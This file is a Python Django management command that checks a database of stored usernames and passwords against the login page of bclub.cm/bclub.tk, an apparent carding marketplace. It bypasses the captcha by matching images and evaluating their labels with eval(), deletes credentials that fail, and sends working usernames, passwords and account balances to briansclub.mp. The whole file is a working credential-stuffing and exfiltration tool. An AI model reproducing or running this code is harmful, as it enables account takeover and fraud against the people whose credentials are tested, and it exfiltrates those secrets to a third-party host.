import requests
import time
import random
from io import BytesIO
from django.conf import settings

from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from django.core.management.base import BaseCommand
from api.models import UserData
from bs4 import BeautifulSoup
from PIL import Image
import numpy as np
import os

def find_identical_and_calculate(img2_url, dir_path):
    response = requests.get(img2_url)
    try:
        img2 = Image.open(BytesIO(response.content))
    except:
        print(f"Cannot identify image: {img2_url}")
        return None
    img2_array = np.array(img2)

    for filename in os.listdir(dir_path):
        if filename.endswith('.png'):
            img1_path = os.path.join(dir_path, filename)
            img1 = Image.open(img1_path)
            img1_array = np.array(img1)

            if np.array_equal(img1_array, img2_array):
                label = os.path.splitext(os.path.basename(img1_path))[0]
                expression = label.split('=')[0]
                result = eval(expression)
                return result
    return None

counter = 0

while True:
    try:
        class Command(BaseCommand):
            help = 'Checks if login is successful and leaves data or removes it based on the result.'
             
            def handle(self, *args, **kwargs):
                session = requests.Session()
                retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
                session.mount('https://', HTTPAdapter(max_retries=retries))

                try:
                    with open('last_successful_index.txt', 'r') as f:
                        start_index = int(f.read())
                except FileNotFoundError:
                    start_index = 0

                user_agents = [
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
                ]
                counter = 0

                while True:
                    for i, user_data in enumerate(UserData.objects.all()[start_index:]):
                        print(f"Checking user {start_index + i + 1} of {UserData.objects.count()}")
                        try:
                            while True:
                                print(';')
                                time.sleep(2)
                                session = requests.Session()
                                print('while loop')
                                headers = {
                                    'User-Agent': random.choice(user_agents)
                                }
                                url = 'https://bclub.cm'if counter % 2 == 0  else 'https://bclub.tk'
                                counter += 1

                                try:
                                    response1 = session.get(url + '/login/', headers=headers, timeout=5)
                                    print(response1)
                                except requests.exceptions.ConnectionError:
                                    print("ConnectionError occurred. Retrying...")
                                    time.sleep(5)
                                    continue

                                soup = BeautifulSoup(response1.content, 'html.parser')
                                input_element = soup.find('input', {'id': 'id_captcha_0'})
                                try:
                                    value = input_element['value']
                                except:
                                    print("Error: Captcha not found")
                                    continue

                                img2_url = url + f'/captcha/image/{value}/'
                                print(img2_url)
                                capvalue=find_identical_and_calculate(img2_url, 'static/public/brianimages/')
                                print(capvalue)

                                csrf_token = response1.cookies['csrftoken']
                                print(csrf_token)

                                headers = {
                                    "X-CSRFToken": csrf_token,
                                    "Content-Type": "application/x-www-form-urlencoded",
                                    "Referer": url + "/login/",
                                    'User-Agent': random.choice(user_agents)
                                }
                                data = {
                                    'csrfmiddlewaretoken': csrf_token,
                                    'username': user_data.username,
                                    'password': user_data.password,
                                    'captcha_0': value,
                                    'captcha_1': capvalue,
                                }
                                try:
                                    response = session.post(url + '/login/', headers=headers, data=data)
                                except requests.exceptions.ConnectionError:
                                    print("ConnectionError occurred. Retrying...")
                                    time.sleep(5)
                                    continue

                                if b'Login or password are incorrect' in response.content:
                                    print("Error: Login failed user and pass")
                                    print(f"Error: Login failed for {user_data.username}")
                                    if user_data.pk is not None:
                                        user_data.delete()
                                    print('deleted')
                                    break

                                else:
                                    print("Login successful")
                                    html_content = response.content
                                    soup = BeautifulSoup(html_content, 'html.parser')
                                    span_element = soup.find('span', {'id': 'user_balance'})

                                    try:
                                        value = span_element.text
                                        print('balance',value)
                                        data = {
                                            'username': user_data.username,
                                            'password': user_data.password,
                                            'balance': value,
                                        }
                                        response2 = requests.put(f'https://briansclub.mp/userdata/{user_data.username}/update/', data=data)
                                        print('response 2 ',response2)
                                        break
                                    except AttributeError:
                                        print("Error: Balance not found")
                                        print(f"Error: Login failed for {user_data.username}")
                                        if response.status_code == 429:
                                            print("Error: Too many requests")
                                            time.sleep(5)
                                        soup = BeautifulSoup(html_content, 'html.parser')
                                        h2_element = soup.find('h2', {'class': 'form-signin-heading'})

                                        if h2_element and h2_element.text == "Secret Phrase Verification":
                                            print("Found secret phrase verification element. Breaking...")
                                            break
                        except Exception as e:
                                print(f"An error occurred: {e}")
                                continue

                        with open('last_successful_index.txt', 'w') as f:
                            f.write(str(start_index + i))

                    print("All users have been checked.")
                    start_index=0

        break
    except Exception as e:
        print(f"An error occurred: {e}")
        continue
